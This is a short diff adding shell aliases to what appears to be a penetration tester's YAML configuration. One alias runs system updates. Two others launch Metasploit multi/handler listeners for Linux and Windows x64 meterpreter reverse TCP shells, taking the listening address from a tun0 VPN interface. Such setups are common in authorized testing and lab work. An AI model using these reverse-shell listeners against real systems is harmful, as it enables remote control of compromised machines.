@@ -1,0 +1,4 @@
+aliases:
+  - alias maintenance='sudo apt update -y && sudo apt full-upgrade -y && sudo apt autoremove -y && sudo updatedb'
+  - alias msf_linux64='msfconsole -x "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST $(ip a s tun0 | grep -oP '\''(?<=inet\s)\d+(\.\d+){3}'\''); set ExitOnSession false; exploit -j"'
+  - alias msf_windows64='msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST $(ip a s tun0 | grep -oP '\''(?<=inet\s)\d+(\.\d+){3}'\''); set ExitOnSession false; exploit -j"'
